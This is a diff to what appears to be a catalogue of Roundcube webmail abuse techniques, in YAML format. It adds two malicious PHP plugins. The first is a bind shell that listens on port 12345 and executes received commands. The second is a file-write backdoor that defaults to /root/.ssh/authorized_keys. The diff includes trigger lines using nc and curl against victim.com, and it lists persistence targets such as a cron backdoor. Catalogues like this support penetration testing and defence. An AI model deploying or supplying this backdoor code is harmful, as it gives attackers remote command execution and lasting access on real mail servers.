@@ -43,6 +43,41 @@ docker:
 
     '
 functions:
+  bind-shell:
+  - code: |
+      <?php
+      // Malicious Roundcube plugin bind shell
+      // Place in plugins/bshell/bshell.php, add 'bshell' to $config['plugins']
+      class bshell extends rcube_plugin {
+          function init() {
+              set_time_limit(0);
+              $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+              socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1);
+              socket_bind($sock, '0.0.0.0', 12345);
+              socket_listen($sock, 1);
+              $cli = socket_accept($sock);
+              while (true) {
+                  $data = socket_read($cli, 65536, PHP_NORMAL_READ);
+                  if (!$data) break;
+                  $out = shell_exec(trim($data));
+                  socket_write($cli, $out ?? '');
+              }
+              socket_close($cli);
+              socket_close($sock);
+          }
+      }
+      ?>
+    comment: |
+      Roundcube plugin bind shell: the plugin's init() creates a TCP listener on port 12345
+      using PHP's socket extension. The page request blocks until the client disconnects.
+      Requires filesystem write access to the Roundcube plugins directory and the ability
+      to add 'bshell' to $config['plugins'] in config/config.inc.php.
+      Connect with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: linux
+    tty: false
   file-read:
   - code: |
       # CVE-2020-12640: read arbitrary files by traversing to a PHP file that echoes its own contents
@@ -69,6 +104,32 @@ functions:
       authenticated:
     version: |
       < 1.4.3
+  file-write:
+  - code: |
+      <?php
+      // Malicious Roundcube plugin that writes arbitrary files
+      // Place in plugins/fwrite/fwrite.php, add 'fwrite' to $config['plugins']
+      class fwrite extends rcube_plugin {
+          function init() {
+              $path    = $_REQUEST['path']    ?? '/root/.ssh/authorized_keys';
+              $content = $_REQUEST['content'] ?? '';
+              if ($content !== '') {
+                  file_put_contents($path, base64_decode($content));
+                  echo 'written';
+              }
+          }
+      }
+      ?>
+    comment: |
+      Roundcube plugin file-write: the plugin writes base64-decoded content to an
+      arbitrary path on each page load when the path and content parameters are supplied.
+      Requires filesystem write access to the Roundcube plugins directory and the ability
+      to add 'fwrite' to $config['plugins'] in config/config.inc.php.
+      Trigger with:
+        curl "http://victim.com/?path=/root/.ssh/authorized_keys&content=$(base64 -w0 ~/.ssh/id_ed25519.pub)"
+      Useful targets: /root/.ssh/authorized_keys, /etc/cron.d/backdoor
+    contexts:
+      admin:
   rce:
   - code: |
       # CVE-2020-12640: local PHP file inclusion via path traversal (authenticated)
